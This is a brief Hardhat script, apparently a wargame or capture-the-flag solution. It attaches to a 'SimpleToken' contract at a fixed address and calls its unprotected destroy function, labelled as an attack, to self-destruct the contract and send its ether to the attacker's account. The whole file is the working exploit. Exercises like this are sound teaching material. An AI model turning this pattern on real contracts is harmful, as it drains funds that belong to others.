const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x2dffb54f6c1e64354e39bdaea0596ffdbb5f7035";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("SimpleToken");
  const contract = Contract.attach(instanceAddress);

  // Attack

  await contract.destroy(attacker.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
